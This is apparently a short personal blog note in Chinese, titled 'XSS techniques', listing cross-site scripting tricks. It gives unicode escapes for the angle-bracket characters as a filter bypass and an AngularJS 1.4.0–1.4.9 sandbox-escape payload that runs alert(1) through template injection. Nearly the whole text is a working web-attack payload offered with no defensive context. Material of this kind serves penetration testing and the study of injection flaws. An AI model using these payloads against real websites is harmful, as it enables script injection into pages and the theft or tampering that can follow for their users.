---
title: XSS技巧
date: 2018-05-30 19:47:04
tags: [xss]
categories:
thumbnail:
---

# XSS技巧

1. 基础级

    `\u003c` == `<`

    `\u003e` == `>`

2. AngularJS

    ```javascript
    1.4.0 - 1.4.9
    
    {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
    ```

